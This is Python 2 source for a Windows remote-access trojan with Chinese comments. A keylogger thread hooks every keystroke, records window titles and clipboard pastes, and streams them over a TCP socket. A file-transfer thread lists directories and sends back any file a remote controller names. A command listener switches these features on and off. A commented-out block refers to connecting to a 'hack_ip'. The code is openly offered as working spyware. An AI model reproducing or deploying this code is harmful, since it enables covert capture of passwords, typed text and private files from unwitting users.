# -*- coding: utf-8 -*- #
from Queue import Queue
import threading
import time
from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import socket
import sys
import os
import struct
import fileOperation


####################类：键盘记录
class Keylogger(threading.Thread):
    def __init__(self, threadname, queue):
        threading.Thread.__init__(self, name=threadname)
        self.data = queue
        self.user32 = windll.user32
        self.kernel32 = windll.kernel32
        self.psapi = windll.psapi
        self.current_window = None

    def GetCurrentProcess(self):
        hwnd = self.user32.GetForegroundWindow()

        # find the process IDFile
        pid = c_ulong(0)
        self.user32.GetWindowThreadProcessId(hwnd, byref(pid))

        # store the current process ID
        process_id = "%d" % pid.value

        # grab the executable
        executable = create_string_buffer("\x00" * 512)
        h_process = self.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        self.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

        # now read it's title
        window_title = create_string_buffer("\x00" * 512)
        self.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        self.data.put("[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))
        print self.data

        # close handle
        self.kernel32.CloseHandle(hwnd)
        self.kernel32.CloseHandle(h_process)

    def KeyStroke(self, event):
        # check to see if target changed windows
        if event.WindowName != self.current_window:
            self.current_window = event.WindowName
            self.GetCurrentProcess()

        # if they pressed a standard key
        if event.Ascii > 32 and event.Ascii < 127:
            print chr(event.Ascii),
            self.data.put(chr(event.Ascii))
        else:
            # if [Ctrl-V], get the value on the clipboard
            if event.Key == "V":
                win32clipboard.OpenClipboard()
                pasted_value = win32clipboard.GetClipboardData()  # 获取剪贴板内容
                win32clipboard.CloseClipboard()
                print "[PASTE] - %s" % (pasted_value),
                self.data.put("[PASTE] - %s" % (pasted_value))
            else:
                print "[%s]" % event.Key,
                self.data.put("[%s]" % (event.Key))
        # pass execution to next hook registered
        return True

    def run(self):
        global a
        # create and register a hook manager
        kl = pyHook.HookManager()  # 创建一个“钩子”管理对象
        kl.KeyDown = self.KeyStroke  # 监听所有键盘事件

        # register the hook and execute forever
        kl.HookKeyboard()  # 设置键盘“钩子”
        pythoncom.PumpMessages(10)  # 进入循环，如不手动关闭，程序将一直处于监听状态)

    def stop(self):
        win32api.PostQuitMessage()
        self.thread_stop = True

        ####################类：键盘记录通信


class CommucationKey(threading.Thread):
    def __init__(self, threadname, queue):
        threading.Thread.__init__(self, name=threadname)
        self.data = queue
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_address = ('127.0.0.1', 20000)
        # print sys.stderr, 'connecting to %s port %s' % server_address
        self.s.connect(self.server_address)

    def run(self):
        print "connect"
        # global message
        while True:
            message = self.data.get()
            self.s.send(message)
            print message
        print "ok"

    def stop(self):
        self.s.close()
        self.thread_stop = True



        # ####################类：文件传输


# class FileSend1(threading.Thread):

#     def __init__(self, threadname, queue, string):
#         threading.Thread.__init__(self, name=threadname)
#         self.file=queue
#         self.filename = string

#     def run(self):
# 		while self.filename!='':
# 		#filename.decode("utf-8")
# 			FILEINFO_SIZE=struct.calcsize('128s32sI8s')
# 			fhead=struct.pack('128s11I',self.filename,0,0,0,0,0,0,0,0,os.stat(self.filename).st_size,0,0)
# 				#self.s.send
# 			self.file.put(fhead)
# 			fp = open(self.filename,'rb')
# 			print 2333
# 			while True:
# 			    filedata = fp.read(self.BUFSIZE)
# 			    if not filedata:
# 			    	break
# 			    self.file.put(filedata)
# 			        # print "connect"
# 			    print 66666

#     def stop(self):
#         self.thread_stop = True

####################类：文件传输通信
class FileSend(threading.Thread):
    def __init__(self, threadname):
        threading.Thread.__init__(self, name=threadname)
        self.filename = ''
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_address = ('127.0.0.1', 20000)
        # print sys.stderr, 'connecting to %s port %s' % server_address
        self.s.connect(self.server_address)

    def run(self):
        print "connect"
        # global message
        while True:
            path = self.s.recv(1024)
            if path:
                if os.path.exists(path):
                    if os.path.isdir(path):
                        for lists in os.listdir(path):
                            self.s.send(lists + "\n")
                    elif os.path.isfile(path):
                        self.filename = path
                        FILEINFO_SIZE = struct.calcsize('128s32sI8s')
                        fhead = struct.pack('128s11I', self.filename, 0, 0, 0, 0, 0, 0, 0, 0,
                                            os.stat(self.filename).st_size, 0, 0)
                        # self.s.send
                        self.s.send(fhead)
                        fp = open(self.filename, 'rb')
                        print 2333
                        while True:
                            filedata = fp.read(1024)
                            if not filedata:
                                break
                            self.s.send(filedata)
                else:
                    self.s.send("path is not exists")
                    # else:
                    #     message = self.file.get()
                    #     self.s.send(message)
                    #     print message
        print "ok"

    def stop(self):
        self.s.close()
        self.thread_stop = True


        ####################函数：键盘记录开启


def KeyboardOpen():
    print "\nkeyboard open"
    if 'threadKey' in globals().keys():
        print "\nkeyboard variable has exsisted ...but"
    else:
        queue1 = Queue()
        threadKey = Keylogger('Key.', queue1)
        threadCom = CommucationKey('Com.', queue1)
        print "\nrecording keyboard"
        threadKey.start()
        threadCom.start()
        threadKey.join()
        threadCom.join()

        ####################函数：键盘记录关闭


def KeyboardClose():
    print "\nkeyboard close"
    if 'threadKey' in globals().keys():
        threadKey.stop()
        threadCom.stop()
        print "closed"
    else:
        print "\nkeyboard haven't been opened"


####################函数：文件传输给开启
def FileOpen():
    print "\nfindfile open"
    if 'threadFile' in globals().keys():
        print "\n... has exsisted ...but"
    # threadKey = keylog.keylogstart()
    else:
        threadFile = FileSend('File.')
        # threadCom = CommucationFile('Com.')
        print "\nNow you can choose file..."
        threadFile.start()
        # threadCom.start()
        # threadFile.join()
        # threadCom.join()


####################函数：文件传输给关闭
def FileClose():
    print "\nfindfile close"
    if 'threadFile' in globals().keys():
        threadFile.stop()
        print "\nclosed"
    else:
        print "\n.... haven't been opened"


def funpass():
    pass


def Operation(repo):
    switcher = {
        "keyboard open": KeyboardOpen,
        "keyboard close": KeyboardClose,
        "findfile open": FileOpen,
        "findfile close": FileClose,
    }
    # switcher.get(argument,funpass)
    HOST = '127.0.0.1'
    PORT = 20000
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 定义socket类型，网络通信，TCP
    s.bind((HOST, PORT))  # 套接字绑定的IP与端口
    s.listen(5)  # 开始TCP监听
    while 1:
        sock, addr = s.accept()  # 接受TCP连接，并返回新的套接字与IP地址
        print'Connected by', addr
    # #---build socket to server
    # hack_ip=fileOperation.getHackIp(repo)
    # server_address= (hack_ip, 20000)
    #
    # # Create aTCP/IP socket
    # # address of server --> the same?
    # sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #
    # # Connect thesocket to the port where the server is listening
    # print >>sys.stderr, 'connecting to %s port %s' % server_address
    #
    # sock.connect(server_address)
    # ip = fileOperation.LocalIp
    # --- send message seems not neccessary , forward socket make sure if solid connect
    #message = "hello to server! from " + str(ip)
    # Send messages on both sockets
    #print >> sys.stderr, '%s: sending "%s"' % (sock.getsockname(), message)
        #sock.send(message)
    #while (1):
        # Read responses on both sockets
        data = sock.recv(1024)
        # if not data:
        # 	print >>sys.stderr, 'closingsocket', sock.getsockname()
        # 	break;

        print >> sys.stderr, '%s: received "%s"' % (sock.getsockname(), data)

        if switcher.has_key(data) == True:
            switcher[data]()  # == fun1()
            # else:
            # 	continue;

            # sock.close()

#Operation(repo)